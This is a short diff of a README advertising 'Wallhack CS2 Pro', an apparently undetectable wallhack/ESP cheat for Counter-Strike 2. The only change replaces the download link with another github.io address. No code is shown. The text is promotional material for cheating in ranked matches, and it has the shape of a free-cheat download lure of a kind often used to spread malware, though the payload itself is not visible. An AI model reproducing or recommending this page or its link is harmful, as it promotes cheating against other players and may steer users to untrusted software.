@@ -2,7 +2,7 @@
 
 Enhance your CS2 gameplay with Wallhack CS2 Pro, the ultimate undetectable ESP tool designed to give you superior visibility, tactical advantages, and a competitive edge in every match. Perfect for players who want to dominate ranked games with precision and confidence.
 
-[![Download Wallhack CS2 Pro](https://img.shields.io/badge/Download-Wallhack_CS2_Pro-blueviolet)](https://wallhack-cs2.github.io/.github/)
+[![Download Wallhack CS2 Pro](https://img.shields.io/badge/Download-Wallhack_CS2_Pro-blueviolet)](https://free-cs2-cheats.github.io/.github/)
 
 ---
 
